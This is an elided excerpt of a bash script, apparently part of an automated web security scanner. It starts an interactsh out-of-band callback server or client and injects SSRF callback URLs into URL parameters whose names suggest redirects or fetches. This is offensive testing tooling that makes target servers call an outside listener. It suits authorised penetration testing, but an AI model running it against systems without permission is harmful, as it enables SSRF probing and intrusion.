...
_oob_start_server() {
    ...
    # ── Priority 1: self-hosted interactsh-server (most reliable) ──
    if command -v interactsh-server &>/dev/null && [ -n "${INTERACTSH_SELF_HOST:-}" ]; then
        log "Starting self-hosted interactsh-server on port 53/80/443..."
        interactsh-server \
            -domain "$INTERACTSH_SELF_HOST" \
            -token "${INTERACTSH_TOKEN:-$(openssl rand -hex 16)}" \
            -responder-ip "${INTERACTSH_IP:-$(curl -s https://api.ipify.org 2>/dev/null || echo '')}" \
            2>"$OOB_DIR/interactsh_server.log" &
        echo $! > "$OOB_DIR/oob_server_pid.txt"
        sleep 3
        # Connect client to self-hosted server
        OOB_DOMAIN="${INTERACTSH_SELF_HOST}"
        if [ -n "$OOB_DOMAIN" ]; then
            echo "$OOB_DOMAIN" > "$OOB_DIR/oob_domain.txt"
            success "Self-hosted OOB server active: $OOB_DOMAIN"
            return
        fi
    fi

    # ── Priority 2: interactsh-client against public/configured server ──
    ...
    log "Starting interactsh-client on ${INTERACTSH_SERVER:-oast.pro} ..."
    interactsh-client \
        -server "${INTERACTSH_SERVER:-oast.pro}" \
        -json \
    ...
    local WAIT=0
    while [ $WAIT -lt 30 ]; do
        OOB_DOMAIN=$(grep -oE "[a-z0-9]{20,}\.${INTERACTSH_SERVER:-oast.pro}" \
...
" "$PURL" "$ENC_PAYLOAD" 2>/dev/null) || INURL=$(printf '%s' "$PURL" | head -c 3000)
    ...
    if [ -s "$PARAM_FILE" ]; then
        grep -iE "$SSRF_PARAM_RE" "$PARAM_FILE" 2>/dev/null | head -100 | while IFS= read -r PURL; do
            ...
            INJECTED=$(python3 -c "
import sys, re
url, ssrf = sys.argv[1], sys.argv[2]
pat = r'([?&](?:url|uri|src|dest|destination|redirect|return|returnto|next|target|path|host|proxy|endpoint|feed|image|img|link|load|callback|webhook|service|api_url|resource|ref|referrer|fetch|open|file|document|page|template|data|input|source|from|location|goto|go|continue|navigate|forward|redir|request|action|site|domain|server|origin|base|back)=)[^&]*'
print(re.sub(pat, lambda m: m.group(1) + ssrf, url, flags=re.IGNORECASE))
" "$PURL" "$SSRF_URL" 2>/dev/null) || INJECTED="$PURL"
...
url, enc = sys.argv[1], sys.argv[2]
print(re.sub(r'=[^&?#]*', lambda m: '=' + enc, url)[:3000])
" "$PURL" "$ENC" 2>/dev/null) || IURL=$(printf '%s' "$PURL" | head -c 3000)
